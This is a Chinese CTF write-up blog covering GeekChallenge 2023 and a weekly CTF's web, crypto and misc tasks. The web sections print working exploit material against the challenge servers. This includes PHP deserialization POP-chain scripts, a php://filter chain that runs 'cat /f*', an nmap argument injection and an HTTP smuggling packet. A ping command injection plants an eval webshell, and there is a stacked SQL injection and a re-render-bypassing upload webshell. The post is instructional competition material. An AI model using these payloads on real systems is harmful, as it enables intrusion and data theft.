base64\rdic=string.printable\rurl=\u0026#39;https://ssi28gtqfby8kz2u0e7bz3vej.node.game.sycsec.com/?tuizi=\u0026#39;\rtable = \u0026#39;\u0026#39;\r#记住要绕过wakeup函数，防止他重置目录，只需要把Idol的参数+1即可\rfor i in range(23,-1,-1):\rfor j in dic:\roriginal_string = \u0026#39;O:7:\u0026#34;Hoshino\u0026#34;:2:{s:4:\u0026#34;Ruby\u0026#34;;O:4:\u0026#34;Idol\u0026#34;:2:{s:5:\u0026#34;Akane\u0026#34;;s:52:\u0026#34;glob:///var/www/html/The\u0026#39;+table+j+\u0026#39;*\u0026#39;*i+\u0026#39;.php\u0026#34;;}s:19:\u0026#34; Hoshino Aquamarine\u0026#34;;N;}\u0026#39;\r# 进行加密\rencoded_bytes = base64.b64encode(original_string.encode(\u0026#39;utf-8\u0026#39;))\rpayload= encoded_bytes.decode(\u0026#39;utf-8\u0026#39;)\rr=requests.get(url+payload)\rif \u0026#39;Kurokawa Akane\u0026#39; in r.text:\rprint(r.text,original_string,table)\rprint()\rtable+=j\rbreak ez_php #\r传入部分源码👇\nif (isset($_GET[\u0026#39;user\u0026#39;])) {\r$user = $_GET[\u0026#39;user\u0026#39;];\rif (!preg_match(\u0026#34;/^[Oa]:[\\d]+/i\u0026#34;, $user)) {\runserialize($user);\r}\relse {\recho(\u0026#34;不是吧，第一层都绕不过去？？？\u0026lt;br\u0026gt;\u0026#34;);\r}\r}\relse {\recho(\u0026#34;快帮我找找她！\u0026lt;br\u0026gt;\u0026#34;);\r} 在CTFshow上有一道类似的题目：愚人杯3rd [easy_php] (yuque.com)，可以参考绕过Oa:\\d的正则，使用C属性\n要先进入useless类的destruct魔术方法里找到key\n$bool=!is_array($this-\u0026gt;QW)\u0026amp;\u0026amp;!is_array($this-\u0026gt;YXX)\u0026amp;\u0026amp;(md5($this-\u0026gt;QW) === md5($this-\u0026gt;YXX)) \u0026amp;\u0026amp; ($this-\u0026gt;QW != $this-\u0026gt;YXX) and $random===\u0026#39;newbee\u0026#39;;#这个newbee不用管他，对判断语句是没有影响的 对于这段判断条件来说，MD5强比较由于前面限制不能为数组，就不能用数组来绕过，同时由于是GET方式传参，在网上能够搜到一些CTF的MD5强碰撞往往是以一些不可见字符组成的字符串，会被url解码从而导致比较失失败，这里偶然间看到一个MD5合集，又学到一个新姿势：php-md5类型题目汇总 | dota_st (wlhhlc.top)\nvar_dump(md5(\u0026#39;INF\u0026#39;)===md5(INF));\r#bool(true) 很巧妙的方式，INF是无限大 \u0026lt;?php\rclass useless {\rprivate $seeyou;\rpublic $QW=\u0026#39;INF\u0026#39;;\rpublic $YXX=INF;\r}\r$a=new useless();\r$b=new ArrayIterator(array($a));\r$a=serialize($b);\recho $a;\r#C:13:\u0026#34;ArrayIterator\u0026#34;:103:{x:i:0;a:1:{i:0;O:7:\u0026#34;useless\u0026#34;:3:{s:15:\u0026#34;%00useless%00seeyou\u0026#34;;N;s:2:\u0026#34;QW\u0026#34;;s:3:\u0026#34;INF\u0026#34;;s:3:\u0026#34;YXX\u0026#34;;d:INF;}};m:a:0:{}}即可绕过第一层 进入第二层：\n这个关键点不在于basename这个函数，虽然basename也有相关的漏洞，这里考察的是server这个全局变量数组\n于是如下图构造url，即可在网页源码里看到php代码\n但是全是base64加密后的代码，而且很长，一般来说就是一个图片\n将其全部值复制下来，去掉首尾的注释符号（/*、*/）\n运行一下，即可得到一个图片👇密码就是：9，名字叫：momo\n至此useless类的destruct利用完毕，准备进入Me类的wakeup\n这个随机字符串的绕过，用**地址引用**即可，然后跳到her类的invoke，再经过serialize跳到sleep方法，再跳到useless的get方法，最后回到her的find函数完毕\n值得注意的是important类里sleep执行后引发的useless类的get方法\n这里的**$zhui[$good]();** 就等同与**$this-\u0026gt;seeyou[$this-\u0026gt;seeyou]();**\n这里我问了问万能的GPT👇\n所以说POP链就是：Me-\u0026gt;wakeup 👉 her-\u0026gt;invoke 👉 important-\u0026gt;sleep 👉useless-\u0026gt;get 👉 her-\u0026gt;find\npoc👇\n\u0026lt;?php\rclass Me {\rpublic $qwe;\rpublic $bro;\rpublic $secret;\r}\rclass her{\rpublic $hername=\u0026#39;momo\u0026#39;;\rpublic $key=9;\rpublic $asd;\rpublic function find() {}\r}\rclass important{\rpublic $power;\r}\rclass useless\r{\rpublic $seeyou;\rpublic $QW;\rpublic $YXX;\r}\r$me=new Me();\r$her=new her();\r$important=new important();\r$useless=new useless();\r$me-\u0026gt;bro=\u0026amp;$me-\u0026gt;secret;\r$me-\u0026gt;qwe=$her;\r$her-\u0026gt;asd=$important;\r$important-\u0026gt;power=$useless;\r$useless-\u0026gt;seeyou[\u0026#39;seeyou\u0026#39;]=[$her, \u0026#39;find\u0026#39;];\recho serialize( new ArrayIterator(array($me)));\r#C:13:\u0026#34;ArrayIterator\u0026#34;:275:{x:i:0;a:1:{i:0;O:2:\u0026#34;Me\u0026#34;:3:{s:3:\u0026#34;qwe\u0026#34;;O:3:\u0026#34;her\u0026#34;:3:{s:7:\u0026#34;hername\u0026#34;;s:4:\u0026#34;momo\u0026#34;;s:3:\u0026#34;key\u0026#34;;i:9;s:3:\u0026#34;asd\u0026#34;;O:9:\u0026#34;important\u0026#34;:1:{s:5:\u0026#34;power\u0026#34;;O:7:\u0026#34;useless\u0026#34;:3:{s:6:\u0026#34;seeyou\u0026#34;;a:1:{s:6:\u0026#34;seeyou\u0026#34;;a:2:{i:0;r:5;i:1;s:4:\u0026#34;find\u0026#34;;}}s:2:\u0026#34;QW\u0026#34;;N;s:3:\u0026#34;YXX\u0026#34;;N;}}}s:3:\u0026#34;bro\u0026#34;;N;s:6:\u0026#34;secret\u0026#34;;R:16;}};m:a:0:{}} 这里忘了说了，题目环境是7.4，PHP版本大于7就对private和public不敏感了，上面没改将就看吧\n进入find函数看看\nfile一眼看就是data伪协议绕过\n那么注意一下ctf和fun，前面有一个new，就不能直接命令执行，这里涉及到PHP原生类读取文件\n【精选】浅谈 php原生类的利用 1(文件操作类)_filesystemiterator-CSDN博客\n最后的payload👇\n在这个PHP文件里拿到flag\nchange_it #\r这道题对上传身份有限制\n解密后是这样的\n找了很久也没找到key的线索，于是干脆就爆破吧🤭\n附上工具连接：GitHub - brendan-rius/c-jwt-cracker: JWT brute force cracker written in C\n下到虚拟机里面去\n可能遇到的问题，参考👉：快速安装 c-jwt-cracker - litluo - 博客园 (cnblogs.com)\n爆破得出key是yibao，直接在jwt.io这个网站里去修改即可，如图修改后即可\n看到此时的状态已经是allow，第一层绕过\n源码中有提示\n\u0026lt;!-- 一直连不上？连不上就对啦！ --\u0026gt;\r\u0026lt;!-- php版本为8.0\rfunction php_mt_seed($seed)\r{\rmt_srand($seed);\r}\r$seed = time();\rphp_mt_seed($seed);\r$characters = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;;\r$newFileName = \u0026#39;\u0026#39;;\rfor ($i = 0; $i \u0026lt; 10; $i++) {\r$newFileName .= $characters[mt_rand(0, strlen($characters) - 1)];\r}\r--\u0026gt; 可以看到文件名称是随机的，但是这种播种子的方式是伪随机的，种子一样，那么出来的随机数序列也是一样，可以在本地测试一下时间，大概推算一下上传时间，然后生成随机名称在连接木马\n然后像这样估摸着大概时间，一个一个的尝试\n然后拿到flag\nezrfi #\r传参如图，拿到hint源码\n解码得到尊嘟假嘟密码（这个在MoeCTF的crypto部分看到过，拿去解密\n尊嘟假嘟O.o (zdjd.asia)\n题目给的提示是：RC4解密，猜测密码为Syclover，拿到hex源码\n文件包含逻辑是include($file.\u0026#34;.py\u0026#34;),你能找到flag文件位置吗?? 如下传参\n?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-\r1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|conver\rt.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-\r16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-\r16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|conver\rt.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-\r16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-\r16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR\r|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-\r932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-\r16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-\r932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-\rdecode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-\r156.JOHAB|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|conver\rt.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|co\rnvert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-\rencode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-\r932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-\rdecode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-\rdecode/resource=php://temp\u0026amp;0=cat%20/f*\r#此步来源于https://www.cnblogs.com/mumuhhh/articles/17860683.html scan_tool #\rnmap这个工具在网鼎杯里出现过\nBUUCTF [网鼎杯 2020 朱雀组] Nmap_[网鼎杯 2020 朱雀组]nmap-CSDN博客\n不过这里过滤的更严格，无法直接写入php一句话木马\n传入参数：\u0026#39; --excludefile /flag -oA aaa \u0026#39; 然后访问aaa.nmap，即可得到flag\nEZ_Smuggling #\r题目是与http走私有关的，不会写，参考极客大挑战2023 Web方向题解wp 全-CSDN博客Jay17大佬的wp复现\n只有admin有权限访问\nburp的repeater设置如下\n然后构造如下包\nPOST / HTTP/2\rHost: 47.108.56.168:20231\rCookie: session=MTcwMTE3OTIzMHxuU2xmbXJZUzlIZHJwalliY3NOX0RnZGdhZE9HeUY4LUN2R2dJbXFXZUJkVnR6MmM5WmE2NGtPMDBIZERFVGYySFBfaFZQZ1dUTmxsa2dwZzVSOGFPVFJyZENaZ1NfV3p8h5Vp25VTWKcqT3tjYkXwER7Dm1NS_lpbiohR-WJ5_xo=\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 0\rOrigin: https://47.108.56.168:20231\rReferer: https://47.108.56.168:20231/\rUpgrade-Insecure-Requests: 1\rSec-Fetch-Dest: document\rSec-Fetch-Mode: navigate\rSec-Fetch-Site: same-origin\rTe: trailers\rGET /admin HTTP/1.1\rHost: 47.108.56.168:20231\rCookie: session=MTcwMTE3OTIzMHxuU2xmbXJZUzlIZHJwalliY3NOX0RnZGdhZE9HeUY4LUN2R2dJbXFXZUJkVnR6MmM5WmE2NGtPMDBIZERFVGYySFBfaFZQZ1dUTmxsa2dwZzVSOGFPVFJyZENaZ1NfV3p8h5Vp25VTWKcqT3tjYkXwER7Dm1NS_lpbiohR-WJ5_xo=\rContent-Length: 1\rx=1 Crypto #\rSignIn #\r信息如下\nBibo...Hello! 你好! こんにちは! Привет! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d… Hmm... Something goes wrong with my grettings bot. 十六进制转换字符串得到flag\nproof_of_work #\r题目要求nc\n这就要写脚本来爆破了，题目是动态的\nimport hashlib\rimport itertools\rfrom string import digits, ascii_letters, punctuation\ralpha_bet = digits + ascii_letters + punctuation\rstrlist = itertools.product(alpha_bet, repeat=4)\rsha256 = \u0026#34;c400239e68f0b952313b370b4f6430fa80d006f4b8bf9949e9e3e211b1f3df88\u0026#34;\rtail = \u0026#34;wFk2UJk5eKncaTiz\u0026#34;\rxxxx = \u0026#39;\u0026#39;\rfor i in strlist:\rdata = i[0] + i[1] + i[2] + i[3]\rdata_sha = hashlib.sha256((data + tail).encode(\u0026#39;utf-8\u0026#39;)).hexdigest()\rif data_sha == sha256:\rxxxx = data\rbreak\rprint(xxxx) OldAlgorithm #\rAn old algorithm but widely used nowadays.\nfrom Crypto.Util.number import * import os flag = b\u0026#34;SYC{Al3XEI_FAKE_FLAG}\u0026#34;\rpad = lambda msg,padlen: msg+os.urandom(padlen-len(msg))\rflag = pad(flag,32)\rprint(len(flag))\rp = [getPrime(16) for _ in range(32)] c = [bytes_to_long(flag)%i for i in p] print(\u0026#39;p=\u0026#39;,p)\rprint(\u0026#39;c=\u0026#39;,c)\r\u0026#39;\u0026#39;\u0026#39;\rp= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]\rc= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]\r\u0026#39;\u0026#39;\u0026#39; 脚本如下👇\nfrom Crypto.Util.number import *\rimport os\rfrom sympy.ntheory.modular import crt\rflag = b\u0026#34;SYC{Al3XEI_FAKE_FLAG}\u0026#34;\rpad = lambda msg, padlen: msg+os.urandom(padlen-len(msg))\rflag = pad(flag, 32)\r# 根据原始代码生成的质数列表和余数列表\rp = [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]\rc = [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]\r# 使用 crt 函数解密得到原始消息\rx = crt(p, c, check=False)\rmsg = long_to_bytes(x[0] % x[1])\rprint(msg) MISC #\rcheekin #\r请前往\u0026quot;三叶草小组Syclover\u0026quot;微信公众号输入flag获得flag\nRGB图片隐写\nez_smilemo #\r游戏通关即可得到flag内容，需要自行添加`SYC{}`包含。例: flag内容为 haha_haha 则最终flag为 SYC{haha_haha} 题目链接：https://pan.baidu.com/s/1Vfklz0_isBoHNylRv8um8w?pwd=geek hint: data.win\n游戏这里就不玩了，直接去分析data.win吧，进去下面的连接，分析win\n如何在没有 Visual FoxPro 的情况下打开 WIN 文件 (filext.com)\nbase64解码即可\nDEATH_N0TE #\r\u0026ldquo;o2takuXX突然失踪了，你作为他的好朋友，决定去他的房间看看是否留下了什么线索\u0026hellip;\u0026quot;。前置剧情题，flag有两段，隐写的信息有点多记得给信息拿全。 hint1: Stegsolve lsb hint2: 图片大小和像素点\n找到一半flag，将图片放大看，能看到一些像素点，但是不清晰\n利用python脚本缩小一下\nfrom PIL import Image\rimg = Image.open(\u0026#39;kamisama.png\u0026#39;)\rw = img.width\rh = img.height\rimg_obj = Image.new(\u0026#34;RGB\u0026#34;,(w//5,h//5))\rfor x in range(w//5):\rfor y in range(h//5):\rpixel = img.getpixel((x*5,y*5))\rif len(pixel) == 3:\r(r, g, b) = pixel\rimg_obj.putpixel((x, y), (r, g, b))\relif len(pixel) == 4:\r(r, g, b, _) = pixel\rimg_obj.putpixel((x, y), (r, g, b))\rimg_obj.save(\u0026#39;123.png\u0026#39;) 得到一些奇怪的文字，搜索一下死亡笔记字体\n下一站是哪儿呢 #\r我和yxx去旅游，前一天还好好的，玩完《指挥官基恩》这个游戏就睡觉了，第二天晚上吃完饭她人就不见了，走之前留下了两张图片就消失了。你能帮我找找她坐哪个航班去哪个地方了嘛？ flag格式：SYC{航班号_城市拼音}，城市拼音首字母大写噢\n百度识图一下\n得知出发地是深圳宝安，用010editor看看猪猪侠的图片\n在中部发现有东西\n放进kali虚拟机里binwalk分离一下\n有一个secret.png和一个txt\n一段看不懂的文字，但是根据提示，应该是指挥官基恩中的文字，搜索一下\n翻译过来是 I WANT TO GO TO LIQUOR CITY（我想去酒城）\n酒城是泸州的别称，根据聊天图，只需要查找8月25日从深圳宝安到泸州的航班就行了\n用这个网站：航线图-Variflight航线图注册一下就行了\n根据时间可知，航班号为CZ8579\nQingwan心都要碎了 #\rQingwan和Yxx一起去旅游，但是Qingwan睡的太死啦，Yxx丢下她一个人去玩了，她一觉起来只看见Yxx发的朋友圈，能帮Qingwan找到她吗？ flag格式：SYC{地点名字}\n磁器口是在重庆，先缩小范围\n发现三峡两个字，那就用重庆+三峡+博物馆作为关键字搜索一下\n得出重庆中国三峡博物馆\nxqr #\rQrcode can deliver binary msg\n题目给了一个二维码，扫了是fakeflag\n拿进010editor看看\n发现还隐藏了另外一张图片\n直接复制89 50 4E 47后面的全部内容，在010上面新建另一个png，用ctrl+shift+v粘贴，然后得到图片\n但是其他大小只有25*25，而附件图片有75*75，打开画图\n修改后保存，打开stegsolve，选image combiner\nXOR后得到一张图，定位点都是有的，不过还是扫不出来的，将其保存下来\n选择反色\n得到的这个二维码就能扫了\n","date":"2023-11-02","externalUrl":null,"permalink":"/posts/2023/11/geekchallenge2023/","section":"Posts","summary":"","title":"极客大挑战2023","type":"posts"},{"content":"\rWEEK1 #\rsignin #\r进去只有一个页面\n源代码里没有东西，扫描后台也没有东西\n放进火狐浏览器，F12进入调试器\n在源码里发现flag\nbaby_php #\r源码如下\n\u0026lt;?php\r// flag in flag.php\rhighlight_file(__FILE__);\rif (isset($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;c\u0026#39;]) \u0026amp;\u0026amp; isset($_COOKIE[\u0026#39;name\u0026#39;])) {\r$a = $_GET[\u0026#39;a\u0026#39;];\r$b = $_GET[\u0026#39;b\u0026#39;];\r$c = $_POST[\u0026#39;c\u0026#39;];\r$name = $_COOKIE[\u0026#39;name\u0026#39;];\rif ($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)) {\rif (!is_numeric($c) \u0026amp;\u0026amp; $c != 1024 \u0026amp;\u0026amp; intval($c) == 1024) {\rinclude($name.\u0026#39;.php\u0026#39;);\r}\r}\r}\r?\u0026gt; 首先是a和b的MD5弱比较\n这个可以用数组绕过，也可以用字符串碰撞\n这里可以使用这两个字符串：QNKCDZO 、 240610708\n然后就是变量c，首先要不能是数字\n在尾部添加%00或者%20等url编码字符会让is_numeric函数判断为非数值，在尾部添加非数字也可以达到这种效果，数组绕过也是可以的\n然后就是变量值不能等于1024，intval值要等于1024\nintval函数一般的绕过思路👇\n当某个数字被过滤时，可以使用它的 8进制/16进制来绕过；比如过滤10，就用012（八进制）或0xA（十六进制）。\n对于弱比较（a==b），可以给a、b两个参数传入空数组，使弱比较为true。\n某个数字被过滤时，可以给它增加小数位来绕过；比如过滤3，就用3.1。\n当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤3，就用3ab。（GET请求的参数会自动拼接单引号）\n当某个数字被过滤时，可以两次取反来绕过；比如过滤10，就用~~10。\n当某个数字被过滤时，可以使用算数运算符绕过；比如过滤10，就用 5+5 或 2*5。\n这里前后观察一下，就能得出只要c为 1024.1123 这样，带个小数部分就行了\n由于flag在flag.php里，include里又有字符串的连接，这里抓个包添加一个cookie头就行了\n不过这样并没有显示flag，或许是flag.php文件里并没有highlight高亮文件\n但是通过include文件包含，可以使用php伪协议读取文件内容\n这里只需要使用filter伪协议就能读出文件源码了\n拿去base64解密一下就能拿到flag\nhello_http #\r第一层：\nError: The GET parameter query must be ctf 传入一个GET变量query，值为ctf\n第二层：\nError: The POST form action must be getflag 传入一个POST变量action，值为getflag\n第三层：\nError: Your are not admin 修改Cookie的role为admin即可\n第四层：\nError: Only allow local IP 用burpsuite抓包，添加X-Forwarded-For头，值为127.0.0.1\n第五层：\nError: You are not using HarmonyOS Browser\n修改User-Agent字段为HarmonyOS Browser（中间有个空格\n第六层：\nError: Only allow access from ys.mihoyo.com 添加Referer头，值为ys.mihoyo.com，到此结束拿到flag\n最终如图\nrepo_leak #\r一个博客网站，源码里没什么东西，直接开始扫后台\n扫出来DS文件\n.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。\n如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。\n这个文件在windows下是无法查看的，会产生乱码\n要放到kali或者其他linux系统下才能查看\n但是并没有用，这里考的不是这个\n给了提示，要看git版本，flag应该在之前的某个版本中\n这里要用到githacker这个工具才行，githack在这里用不了\n#安装githacker\rpython -m pip install -i https://pypi.org/simple/ GitHacker #python3环境下\r#运行\rgithacker --url http://120.27.148.152:50013/.git/ --output-folder 随便起一个目录 完成之后cd进去\n能看到有flag，切换一下版本\n然后进入文件夹看看，打开index.html的源码\n查找一下flag\nping #\r看起来是一个命令执行\n在源码里发现hint\n代码如下\n\u0026lt;?php\rfunction sanitize($s) {\r$s = str_replace(\u0026#39;;\u0026#39;, \u0026#39;\u0026#39;, $s);\r$s = str_replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;, $s);\r$s = str_replace(\u0026#39;/\u0026#39;, \u0026#39;\u0026#39;, $s);\r$s = str_replace(\u0026#39;flag\u0026#39;, \u0026#39;\u0026#39;, $s);\rreturn $s;\r}\rif (isset($_GET[\u0026#39;source\u0026#39;])) {\rhighlight_file(__FILE__);\rdie();\r}\rif (!isset($_POST[\u0026#39;ip\u0026#39;])) {\rdie(\u0026#39;No IP Address\u0026#39;);\r}\r$ip = $_POST[\u0026#39;ip\u0026#39;];\r$ip = sanitize($ip);\rif (!preg_match(\u0026#39;/((\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])/\u0026#39;, $ip)) {\rdie(\u0026#39;Invalid IP Address\u0026#39;);\r}\rsystem(\u0026#39;ping -c 4 \u0026#39;.$ip. \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;);\r?\u0026gt; 能看到当前目录的一些东西\n不过反斜杠被过滤了，这里无法使用\n空格也被过滤了，不过可以用$IFS、${IFS}等代替\n尖括号没有被过滤，我们就可以写入php文件\n可以配合base64编码来写入文件\nip=127.0.0.1|echo$IFS\u0026#34;PD9waHAgZXZhbCgkX1BPU1RbYV0pOz8+\u0026#34;|base64${IFS}-d${IFS}\u0026gt;a.php\r#\u0026lt;?php eval($_POST[a]);?\u0026gt; 然后访问a.php\n就能拿到flag\nWEEK2 #\r前言 #\r由于week2的题难度要比week1的大一些\n出题人也是不断的给hint\nez_sqli #\rhint如下👇\nHint 1: Docker 环境: mysql:5.7\rHint 2: 堆叠注入 (cursor.execute() 能够执行多条 SQL 语句)\rHint 3: 关键词: set prepare executeHint 4: flag 位置: select flag from flag\rHint 5: 请不要使用 sqlmap 等自动化工具 跑不出来的\rHint 6: 尝试通过 set 设置一个变量 其内容为待执行的 SQL 语句 然后使用 prepare + execute 来执行该 SQL 语句 (你可能需要通过某些方法对 SQL 语句进行编码或者拼接以绕过关键词检测) 然后题目源码如下\nfrom flask import Flask, render_template, request\rimport MySQLdb\rimport re\rblacklist = [\u0026#39;select\u0026#39;, \u0026#39;update\u0026#39;, \u0026#39;insert\u0026#39;, \u0026#39;delete\u0026#39;, \u0026#39;database\u0026#39;, \u0026#39;table\u0026#39;, \u0026#39;column\u0026#39;, \u0026#39;alter\u0026#39;, \u0026#39;create\u0026#39;, \u0026#39;drop\u0026#39;, \u0026#39;and\u0026#39;, \u0026#39;or\u0026#39;, \u0026#39;xor\u0026#39;, \u0026#39;if\u0026#39;, \u0026#39;else\u0026#39;, \u0026#39;then\u0026#39;, \u0026#39;where\u0026#39;]\rconn = MySQLdb.connect(host=\u0026#39;db\u0026#39;, port=3306, user=\u0026#39;root\u0026#39;, passwd=\u0026#39;root\u0026#39;, db=\u0026#39;ctf\u0026#39;)\rapp = Flask(__name__)\r@app.route(\u0026#39;/\u0026#39;)\rdef index():\rfield = request.args.get(\u0026#39;order\u0026#39;, \u0026#39;id\u0026#39;)\rfield = re.sub(r\u0026#39;\\s+\u0026#39;, \u0026#39;\u0026#39;, field)\rfor s in blacklist:\rif s.lower() in field.lower():\rreturn s + \u0026#39; are banned\u0026#39;\rif not re.match(r\u0026#34;id|name|email\u0026#34;, field):\rfield = \u0026#39;id\u0026#39;\rwith conn.cursor() as cursor:\rcursor.execute(\u0026#39;SELECT * FROM userinfo order by %s\u0026#39; % field)\rres = cursor.fetchall()\rreturn render_template(\u0026#39;index.html\u0026#39;, res=res)\rif __name__ == \u0026#39;__main__\u0026#39;:\rapp.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000, debug=True) 可以看到过滤了select、table、等，还去掉了空格\n结合出题人的hint，可知要使用预处理的方法来执行sql命令\n这两个博客讲的很详细：SQL注入进阶之路-针对堆叠注入的研究 - mi2ac1e - 博客园 (cnblogs.com)\n记录mysql 存储过程中通过使用PREPARE、EXECUTE 预处理语句实现执行动态SQL语句 - rhyswang - 博客园 (cnblogs.com)\n总的来说预处理的步骤👇\n#1 设置用户变量的值\rset @code= 。。。。 ;\r#2 预处理,将用户变量code的值赋给p\rprepare p from @code ;\r#3 执行预处理后的语句\rexecute p; 这里由于有黑名单，我们就只有通过concat来进行字符串的拼接\n空格有/**/来绕过\n所以最后的payload👇\nset/**/@pr1=concat(\u0026#39;selec\u0026#39;,\u0026#39;t/**/fla\u0026#39;,\u0026#39;g/**/from/**/fl\u0026#39;,\u0026#39;ag\u0026#39;);\rprepare/**/p/**/from/**/@pr1;EXECUTE /**/p; ez_upload #\rhint👇\nHint 1: Docker 环境: php:7.4-apache\rHint 2: 代码中的 imagecreatefromXXX 和 imageXXX 函数来源于 PHP 的 GD 库\rHint 3: GD 库会对图片进行二次渲染\rHint 4: 如果上传正确的图片马后出现报错请将 BurpSuite 设置中的 Character Sets 改回 Recognize automatically based on message headers (例如 https://blog.csdn.net/weixin_44937683/article/details/127516562 这篇文章就是个错误示范 需要把 Character Sets 改回去)\rHint 5: 你需要在网上找到一些针对 gif/png/jpg 格式的二次渲染绕过脚本 另外注意代码并没有限制上传文件的后缀 那就是经典的二次渲染了\n二次渲染会修改图片源码中的部分代码，只先上传再下载图片，与原图片的代码对比，在没有发生变化的部分写入php代码即可。\n这种二次渲染的题，最好还是用gif的图片来做，比较稳定，其他的jpg、png很容易失败，下面这张图就是我用的，源码比较短。\n可以看到上传前👇\n下面是上传后的，我在不变的区域加入了php代码\n由于没有限制后缀，只需要抓包把content-type修改为image/gif，然后文件名修改为1.php即可上传\nez_unserialize #\rhint👇\nHint 1: Docker 环境: php:7.4-apache\rHint 2: 你可以通过 PHP 的引用来绕过 __wakeup (https://www.php.net/manual/zh/language.references.php)\rHint 3: 尝试将 Cache 的 expired 字段的引用赋值给另外一个变量\rHint 4: 调用链: DataObject.__destruct() -\u0026gt; Storage.__set() -\u0026gt; Cache.expired() -\u0026gt; Helper.__call()\rHint 5: 尝试向 DataObject 中放入 cache1 和 cache2 